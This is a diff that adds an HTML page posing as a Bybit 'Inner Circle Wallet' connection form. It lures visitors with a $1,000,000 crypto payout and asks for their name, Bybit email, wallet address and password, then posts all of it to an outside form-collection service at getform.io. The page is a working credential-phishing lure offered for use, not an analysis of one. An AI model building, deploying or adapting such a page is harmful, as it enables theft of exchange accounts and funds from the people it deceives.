@@ -1,0 +1,77 @@
+<!doctype html>
+<html lang="en"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>User Information Form</title> 
+  <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            text-align: center;
+            background: cyan;
+        }
+        form {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        label, input, select {
+            display: block;
+            margin: 10px auto;
+        }
+        input, select {
+            width: 80%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        h2 {
+            color: red;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: red;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+    </style> 
+ </head> 
+ <body> 
+  <h2>Inner Circle Wallet</h2> 
+  <h2>connect bybit</h2> 
+  <form action="https://getform.io/f/ayvvdneb" method="POST"> 
+   <label for="name">Name:</label> 
+   <input type="text" id="name" name="name" required> 
+   <label for="email">bybit Email:</label> 
+   <input type="email" id="email" name="email" required> 
+   <label for="amount">Amount:</label> 
+   <select id="amount" name="amount" required> 
+    <option value="1000000">$1,000,000</option> 
+   </select> 
+   <label for="crypto">Crypto Coin:</label> 
+   <select id="crypto" name="crypto" required> 
+    <option value="BTC">Bitcoin (BTC)</option> 
+    <option value="ETH">Ethereum (ETH)</option> 
+    <option value="USDT">Tether (USDT)</option> 
+    <option value="XRP">Ripple (XRP)</option> 
+    <option value="DOGE">Dogecoin (DOGE)</option> 
+    <option value="ADA">Cardano (ADA)</option> 
+    <option value="SOL">Solana (SOL)</option> 
+    <option value="DOT">Polkadot (DOT)</option> 
+    <option value="MATIC">Polygon (MATIC)</option> 
+   </select> 
+   <label for="address">Coin Address:</label> 
+   <input type="text" id="address" name="address" required> 
+   <label for="passwor">password:</label> 
+   <input type="passwor" id="passwor" name="passwor" required> 
+   <label for="confirm">Again:</label> 
+   <input type="passwor" id="confirm" name="confirm" required> 
+   <button type="submit">Receive</button> 
+  </form> 
+ 
+</body></html>
